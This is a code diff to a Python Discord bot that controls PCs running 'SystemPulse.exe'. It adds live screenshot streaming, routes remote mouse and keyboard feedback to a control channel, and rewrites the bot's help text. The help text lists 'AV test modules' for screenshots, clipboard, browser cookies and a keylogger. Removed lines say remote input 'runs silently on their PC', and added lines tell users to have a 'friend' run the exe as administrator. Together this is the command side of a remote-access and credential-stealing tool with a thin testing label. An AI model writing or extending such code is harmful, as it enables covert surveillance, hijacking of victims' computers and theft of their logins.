@@ -591,17 +591,47 @@ async def _post_live_event(
             content = _role_mention(watch)
 
     file = None
-    if image_b64 and event.get("module") == "screenshot":
+    if image_b64 and event.get("module") in ("screenshot", "liveview"):
+        try:
+            fname = "liveview.png" if event.get("module") == "liveview" else "desktop_capture.png"
+            file = discord.File(
+                io.BytesIO(base64.b64decode(image_b64)),
+                filename=fname,
+            )
+            embed.set_image(url=f"attachment://{fname}")
+        except (ValueError, TypeError) as exc:
+            print(f"[bot] Image attach failed: {exc}")
+
+    await channel.send(content=content, embed=embed, file=file)
+
+
+async def _post_control_feedback(
+    guild_id: str,
+    watch: GuildWatch,
+    event: dict,
+) -> None:
+    """Post mouse/keyboard/liveview feedback to the control channel."""
+    ch_id = watch.control_channel_id or watch.channel_id
+    channel = bot.get_channel(ch_id)
+    if channel is None:
+        guild = bot.get_guild(int(guild_id))
+        if guild:
+            channel = guild.get_channel(ch_id)
+    if channel is None:
+        return
+    embed = _embed_for_event(event)
+    image_b64 = _event_image_b64(event)
+    file = None
+    if image_b64 and event.get("module") == "liveview":
         try:
             file = discord.File(
                 io.BytesIO(base64.b64decode(image_b64)),
-                filename="desktop_capture.png",
+                filename="liveview.png",
             )
-            embed.set_image(url="attachment://desktop_capture.png")
-        except (ValueError, TypeError) as exc:
-            print(f"[bot] Screenshot attach failed: {exc}")
-
-    await channel.send(content=content, embed=embed, file=file)
+            embed.set_image(url="attachment://liveview.png")
+        except (ValueError, TypeError):
+            pass
+    await channel.send(embed=embed, file=file)
 
 
 async def _fetch_latest_event_id() -> int:
@@ -676,7 +706,11 @@ async def poll_events() -> None:
                         continue
 
                     try:
-                        await _post_live_event(channel, watch, event)
+                        module = event.get("module") or ""
+                        if module in ("liveview", "remote_input") and watch.control_channel_id:
+                            await _post_control_feedback(guild_id, watch, event)
+                        else:
+                            await _post_live_event(channel, watch, event)
                         watch.last_event_id = event_id
                     except discord.HTTPException as exc:
                         print(f"[bot] Send failed guild={guild_id}: {exc}")
@@ -1157,25 +1191,28 @@ async def help_command(interaction: discord.Interaction) -> None:
         inline=False,
     )
     embed.add_field(
-        name="3 · See who's online",
-        value="`/controlfromdiscord online` — lists PCs with the exe running",
-        inline=False,
-    )
-    embed.add_field(
-        name="4 · Run AV test modules",
+        name="3 · Live screen (not automatic)",
         value=(
-            "`/controlfromdiscord run` — pick hostname + module\n"
-            "Examples: screenshot, clipboard, cookies, keylogger\n"
-            "Results appear in your `/pulse link` channel"
+            "`/controlfromdiscord online` — who has the exe open (list only)\n"
+            "`/controlfromdiscord screen start` — live screenshots every ~3s in control channel\n"
+            "`/controlfromdiscord screen stop` — stop live screen"
         ),
         inline=False,
     )
     embed.add_field(
-        name="5 · Mouse & keyboard",
+        name="4 · Mouse & keyboard",
         value=(
-            "`/controlfromdiscord mouse` — move or click at x,y\n"
+            "`/controlfromdiscord mouse` — click at x,y (use screen size from `/online`)\n"
             "`/controlfromdiscord keyboard` — type text or press a key\n"
-            "Runs silently on their PC (nothing shown in the exe)"
+            "Friend must use **latest exe** + **Run as administrator**"
+        ),
+        inline=False,
+    )
+    embed.add_field(
+        name="5 · AV test modules",
+        value=(
+            "`/controlfromdiscord run` — screenshot, cookies, clipboard, etc.\n"
+            "Results go to `/pulse link` channel"
         ),
         inline=False,
     )
@@ -1238,7 +1275,10 @@ async def cfd_online(interaction: discord.Interaction) -> None:
 
     embed = discord.Embed(
         title="Online SystemPulse endpoints",
-        description="PCs heartbeat while SystemPulse.exe is open.",
+        description=(
+            "Shows who has the exe open — **not** live video.\n"
+            "Use **`/controlfromdiscord screen start`** for live screen frames."
+        ),
         color=PULSE_COLOR,
     )
     if not hosts:
@@ -1250,9 +1290,14 @@ async def cfd_online(interaction: discord.Interaction) -> None:
     else:
         lines = []
         for h in hosts[:15]:
-            lines.append(f"**{h.get('hostname', '?')}** — `{h.get('username', '—')}`")
+            name = h.get("hostname", "?")
+            user = h.get("username", "—")
+            sw = h.get("screen_width")
+            sh = h.get("screen_height")
+            extra = f" · screen `{sw}×{sh}`" if sw and sh else ""
+            lines.append(f"**{name}** — `{user}`{extra}")
         embed.add_field(name=f"{len(hosts)} online", value="\n".join(lines), inline=False)
-        embed.set_footer(text="Use /controlfromdiscord run, mouse, or keyboard")
+        embed.set_footer(text="screen start → live frames · mouse/keyboard need new exe + admin")
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
@@ -1363,6 +1408,72 @@ async def cfd_keyboard(
         payload=payload,
         summary=summary,
     )
+
+
+SCREEN_ACTIONS = [
+    app_commands.Choice(name="Start live screen", value="start"),
+    app_commands.Choice(name="Stop live screen", value="stop"),
+]
+
+
+@controlfromdiscord.command(
+    name="screen",
+    description="Start/stop live screen frames in your control channel (~every 3s)",
+)
+@app_commands.describe(
+    hostname="PC name (must be online)",
+    action="Start sends screenshots to control channel; stop ends it",
+    interval="Seconds between frames when starting (2–15)",
+)
+@app_commands.autocomplete(hostname=_hostname_autocomplete)
+@app_commands.choices(action=SCREEN_ACTIONS)
+@app_commands.guild_only()
+async def cfd_screen(
+    interaction: discord.Interaction,
+    hostname: str,
+    action: str,
+    interval: app_commands.Range[float, 2, 15] = 3,
+) -> None:
+    gid = _guild_id(interaction)
+    if not gid:
+        return
+    enabled = action == "start"
+    assert http_client is not None
+    try:
+        res = await http_client.put(
+            f"{API_URL}/api/bot/liveview",
+            json={
+                "hostname": hostname,
+                "enabled": enabled,
+                "interval": float(interval),
+                "guild_id": gid,
+            },
+            headers=_headers(),
+        )
+        res.raise_for_status()
+    except httpx.HTTPError as exc:
+        await interaction.response.send_message(f"Screen control failed: {exc}", ephemeral=True)
+        return
+
+    control_ch = _control_channel_id(gid)
+    if enabled:
+        msg = (
+            f"Live screen **started** on `{hostname}` (every {interval:.0f}s).\n"
+            "Frames post in your **control channel** — use screen size for `/mouse` coords.\n"
+            "Friend needs **latest SystemPulse.exe** (Run as administrator)."
+        )
+    else:
+        msg = f"Live screen **stopped** on `{hostname}`."
+
+    await interaction.response.send_message(msg, ephemeral=True)
+    if control_ch and enabled:
+        channel = bot.get_channel(control_ch)
+        if channel is None and interaction.guild:
+            channel = interaction.guild.get_channel(control_ch)
+        if isinstance(channel, discord.TextChannel):
+            await channel.send(
+                f"📺 **{interaction.user.display_name}** started live screen on **{hostname}**"
+            )
 
 
 @bot.event
